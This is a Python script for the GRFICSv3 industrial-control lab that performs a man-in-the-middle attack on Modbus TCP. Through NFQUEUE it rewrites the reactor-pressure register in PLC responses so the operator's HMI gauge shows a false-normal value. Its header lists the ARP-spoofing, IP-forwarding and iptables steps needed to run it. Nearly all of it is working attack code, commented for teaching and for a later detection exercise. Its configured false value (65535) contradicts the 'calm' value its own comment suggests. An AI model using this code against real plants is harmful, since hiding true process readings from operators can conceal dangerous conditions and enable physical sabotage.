#!/usr/bin/env python3
"""
modbus_mitm_conceal.py
----------------------
GRFICSv3 LAB ONLY — Modbus FC4 response falsification (concealment demo).

PURPOSE
    Sits on the NFQUEUE that your iptables rule feeds, inspects each packet the
    PLC sends back to the HMI, and — for FC4 (Read Input Registers) responses
    that contain reactor-pressure register 8 — rewrites that one register's value
    to a "false-normal" number before the packet continues to the HMI.

    Net effect: the operator's pressure gauge shows a calm value while the real
    register 8 may be doing something else entirely. This is the deception layer.

WHAT IT DELIBERATELY DOES NOT DO
    It does not issue any write/command toward the PLC and does not alter the
    process. It only edits a *displayed reading* in transit. That keeps it a pure
    "make the gauge lie" tool — the concealment half you'll then learn to DETECT.

PREREQUISITES (run in this order, see bottom of file for the full sequence)
    1. ARP spoof BOTH directions (HMI<->gateway) so traffic routes through Kali
    2. echo 1 > /proc/sys/net/ipv4/ip_forward   (forward what you don't consume)
    3. iptables rule diverting PLC responses to NFQUEUE 1
    4. sudo python3 modbus_mitm_conceal.py

DEPENDENCIES (install on Kali)
    sudo apt install python3-scapy -y
    sudo apt install python3-netfilterqueue -y     (or: pip install NetfilterQueue)
"""

# ─────────────────────────────────────────────────────────────────────────────
# IMPORTS
# ─────────────────────────────────────────────────────────────────────────────

# NetfilterQueue: lets this Python program attach to the kernel NFQUEUE that your
# iptables "-j NFQUEUE --queue-num 1" rule feeds. Each diverted packet is handed
# to our callback, and the packet WAITS (does not reach the HMI) until we either
# .accept() it (send it on) or .drop() it (discard). This holding behaviour is
# what makes *modification* possible — Wireshark only copies; this intercepts.
from netfilterqueue import NetfilterQueue

# Scapy: parses raw packet bytes into navigable layers (IP / TCP / Raw payload)
# so we can read and rewrite fields without hand-counting every byte offset.
from scapy.all import IP, TCP, Raw

import struct   # converts between Python ints and raw bytes (the register value)
import sys      # used only for a clean startup message / exit

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION — edit these to match your lab
# ─────────────────────────────────────────────────────────────────────────────

# The register you want to falsify. From your mapping work, register 8 = reactor
# pressure (your highest-confidence identification).
TARGET_REGISTER_INDEX = 8

# The raw UINT16 value the HMI should SEE instead of the real one.
# This must be the RAW register value (0–65535), not the engineering value (kPa).
# Example: if normal running pressure ≈ 2700 kPa and your calibration is ~0–3000 kPa,
# then raw ≈ (2700/3000)*65535 ≈ 58981. Pick a value that reads as "calm/normal"
# on the gauge. Tune this once you confirm the scaling against the HMI.
FALSE_RAW_VALUE = 65535

# Modbus PLC IP — only packets *from* this host are candidates for rewriting.
PLC_IP = "192.168.95.2"

# Modbus function code we care about: FC4 = Read Input Registers (live sensor data).
FC_READ_INPUT_REGISTERS = 0x04

# ─────────────────────────────────────────────────────────────────────────────
# MODBUS TCP RESPONSE LAYOUT (so the offsets below make sense)
# ─────────────────────────────────────────────────────────────────────────────
#
# A Modbus-TCP message = 7-byte MBAP header + PDU.
#
#   MBAP header (7 bytes):
#     bytes 0-1  Transaction ID
#     bytes 2-3  Protocol ID (0x0000 for Modbus)
#     bytes 4-5  Length (number of following bytes)
#     byte  6    Unit ID
#
#   PDU for an FC4 *response*:
#     byte  7    Function code (0x04 if normal; 0x84 = exception)
#     byte  8    Byte count (how many data bytes follow = 2 * num_registers)
#     byte  9..  Register data, big-endian, 2 bytes per register:
#                  register 0 -> bytes 9,10
#                  register 1 -> bytes 11,12
#                  register N -> bytes (9 + 2*N), (10 + 2*N)
#
# So register 8's two bytes start at offset: 9 + 2*8 = 25 (and 26).
# We compute this rather than hard-code it, so changing TARGET_REGISTER_INDEX works.

MBAP_LEN = 7                       # MBAP header length
FUNC_CODE_OFFSET = MBAP_LEN        # = 7
BYTE_COUNT_OFFSET = MBAP_LEN + 1   # = 8
DATA_START_OFFSET = MBAP_LEN + 2   # = 9  (first register's high byte)


def register_byte_offset(reg_index: int) -> int:
    """Byte offset of the HIGH byte of register `reg_index` within the Modbus payload."""
    # Each register is 2 bytes; data begins at DATA_START_OFFSET.
    return DATA_START_OFFSET + (2 * reg_index)


# ─────────────────────────────────────────────────────────────────────────────
# THE CALLBACK — runs once per diverted packet
# ─────────────────────────────────────────────────────────────────────────────

def process_packet(pkt):
    """
    Called by NetfilterQueue for every packet the iptables rule diverts.
    MUST end by either pkt.accept() (forward it) or pkt.drop() (discard it).
    Forgetting to do so freezes the connection and the HMI loses the PLC — a
    glaring red flag, the opposite of concealment. So every path below accepts.
    """

    # Wrap the raw bytes the kernel handed us into a Scapy IP packet so we can
    # navigate its layers by name instead of slicing bytes blindly.
    scapy_pkt = IP(pkt.get_payload())

    # ── Guard 1: must be TCP and carry a payload ────────────────────────────────
    # Non-TCP or empty-payload packets can't be Modbus data we care about.
    # Pass them straight through untouched. (Letting unrelated traffic flow
    # normally is essential — break nothing you don't intend to.)
    if not scapy_pkt.haslayer(TCP) or not scapy_pkt.haslayer(Raw):
        pkt.accept()
        return

    # ── Guard 2: must originate from the PLC ────────────────────────────────────
    # Our iptables rule already filters --sport 502, but double-checking the
    # source IP keeps the script correct even if the rule is broadened later.
    if scapy_pkt[IP].src != PLC_IP:
        pkt.accept()
        return

    # Pull the raw Modbus bytes out of the TCP payload.
    payload = bytes(scapy_pkt[Raw].load)

    # ── Guard 3: payload must be long enough to even have a function code ────────
    if len(payload) <= FUNC_CODE_OFFSET:
        pkt.accept()
        return

    # ── Guard 4: must be an FC4 (Read Input Registers) response ─────────────────
    # payload[7] is the function code byte. If it isn't FC4, this isn't the
    # sensor-read response we falsify (could be FC1 coils, FC3, an exception 0x84,
    # etc.) — leave it alone.
    function_code = payload[FUNC_CODE_OFFSET]
    if function_code != FC_READ_INPUT_REGISTERS:
        pkt.accept()
        return

    # ── Guard 5: this response must actually CONTAIN register 8 ─────────────────
    # byte_count (payload[8]) = number of data bytes = 2 * number_of_registers.
    # A response only includes register 8 if it returned at least 9 registers
    # (indices 0..8). If the HMI polled a smaller block, register 8 isn't here.
    byte_count = payload[BYTE_COUNT_OFFSET]
    num_registers = byte_count // 2
    if num_registers <= TARGET_REGISTER_INDEX:
        pkt.accept()
        return

    # Compute where register 8's two bytes live, and make sure the packet is
    # physically long enough to hold them (defensive against malformed/truncated).
    hi_off = register_byte_offset(TARGET_REGISTER_INDEX)   # high byte offset
    lo_off = hi_off + 1                                     # low  byte offset
    if len(payload) <= lo_off:
        pkt.accept()
        return

    # ── Read the REAL value (for logging / proof the attack works) ──────────────
    # ">H" = big-endian (Modbus byte order) unsigned 16-bit int.
    real_value = struct.unpack(">H", payload[hi_off:lo_off + 1])[0]

    # ── Overwrite register 8 with the false-normal value ────────────────────────
    # Pack our fake UINT16 back into 2 big-endian bytes.
    false_bytes = struct.pack(">H", FALSE_RAW_VALUE)

    # Rebuild the payload with those two bytes swapped in. (bytes are immutable,
    # so we splice: everything before reg8 + fake bytes + everything after.)
    new_payload = payload[:hi_off] + false_bytes + payload[lo_off + 1:]

    # Put the edited payload back onto the packet.
    scapy_pkt[Raw].load = new_payload

    # ── Fix the checksums ───────────────────────────────────────────────────────
    # We changed the payload, so the IP and TCP checksums are now wrong. If we
    # leave them, the HMI's NIC/stack will reject the packet as corrupt and the
    # gauge won't update at all (or the connection stutters). Deleting the
    # checksum fields makes Scapy RECOMPUTE them when it re-serializes the packet.
    del scapy_pkt[IP].chksum
    del scapy_pkt[TCP].chksum
    # (Modbus TCP itself has no application-layer checksum — TCP covers it — so
    #  there's nothing else to recompute. This is why Modbus/TCP is so easy to
    #  tamper with, and a key point for your write-up.)

    # Hand the rebuilt bytes back to the kernel for this queued packet.
    pkt.set_payload(bytes(scapy_pkt))

    # Log what we did so you have proof for screenshots / the portfolio.
    print(f"[MODIFIED] reg{TARGET_REGISTER_INDEX} "
          f"real={real_value} -> shown={FALSE_RAW_VALUE}  (FC4, {num_registers} regs)")

    # Release the (now-falsified) packet onward to the HMI.
    pkt.accept()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN — attach to the queue and run
# ─────────────────────────────────────────────────────────────────────────────

def main():
    nfqueue = NetfilterQueue()

    # Bind our callback to queue number 1 — this MUST match the --queue-num in
    # your iptables rule (NFQUEUE --queue-num 1).
    nfqueue.bind(1, process_packet)

    print("[*] Modbus concealment MITM running on NFQUEUE 1.")
    print(f"[*] Falsifying register {TARGET_REGISTER_INDEX} from PLC {PLC_IP} "
          f"-> raw {FALSE_RAW_VALUE}.")
    print("[*] Ctrl+C to stop (then flush iptables — see teardown).")

    try:
        # Blocks here, processing packets until interrupted.
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Stopping. Remember to flush the iptables rule (teardown).")
    finally:
        # Always unbind cleanly so the queue is released.
        nfqueue.unbind()
        sys.exit(0)


if __name__ == "__main__":
    main()
